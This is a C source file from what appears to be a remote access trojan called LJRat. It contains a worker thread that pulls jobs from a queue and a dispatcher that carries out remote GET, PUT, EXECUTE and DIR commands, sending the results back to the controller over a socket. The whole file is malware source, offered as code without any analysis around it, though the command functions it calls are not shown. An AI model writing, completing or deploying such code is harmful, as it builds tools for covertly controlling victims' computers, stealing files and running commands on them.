#include "LJRat.h"
#include "worker.h"
#include "list.h"
#include "error.h"
#include "message.h"
#include "debug.h"
#include "session.h"

extern SESSION_CTX session_ctx;

enum CMD_TYPE {
    GET = 0x01,
    EXECUTE,
    PUT,
    DIR
};

static ERROR_T ProcessWork(PMESSAGE pMsg);

unsigned int __stdcall WorkerThread(PVOID pArg)
{
    INT iError = E_SUCCESS;
    PLIST_ITEM pItem = NULL;

    while (SHUTDOWN_INITIATED != session_ctx.gShutdown) {

        if (TRUE == SRWListIsEmpty(&session_ctx.job_list)) {
            WaitForSingleObject(session_ctx.hJobWait, INFINITE);
        }

        pItem = (PLIST_ITEM) SRWListRemoveHead(&session_ctx.job_list);
        if (NULL == pItem)
        {
            iError = E_JOB_REMOVE_ERROR;
            goto end;
        }

        ProcessWork((PMESSAGE) pItem->pData);
        HeapFree(GetProcessHeap(), 0, pItem);
        DBG_PRINT("Processed work item\n");
    } 

end:
    return iError;
}

ERROR_T ProcessWork(PMESSAGE pMsg)
{
    INT iError = E_SUCCESS;
    PMESSAGE pResult = NULL;

    DBG_PRINT("Len: %d CMD_TYPE: %d JOB_ID: %d\n", pMsg->hdr.dwMessageSize, pMsg->hdr.dwCommand, pMsg->hdr.dwJobID);

    switch(pMsg->hdr.dwCommand) {
        case GET:
            iError = GetCmd(pMsg, &pResult);
            break;
        case PUT:
            iError = PutCmd(pMsg, &pResult);
            break;
        case EXECUTE:
            iError = ExecuteCmd(pMsg, &pResult);
            break;
        case DIR:
            iError = DirCmd(pMsg, &pResult);
            break;

        default:
            break;
    }

    // TODO Do something when a critical error happens

    if (E_SUCCESS != iError) {
        DBG_PRINT("Error processing work %d\n", iError);
    }

    iError = MessageSend(session_ctx.sock, pResult);
    if (E_SUCCESS != iError) {
        DBG_PRINT("Error sending results\n");
    }

end:
    MessageFree(&pMsg);    
    return iError;
}





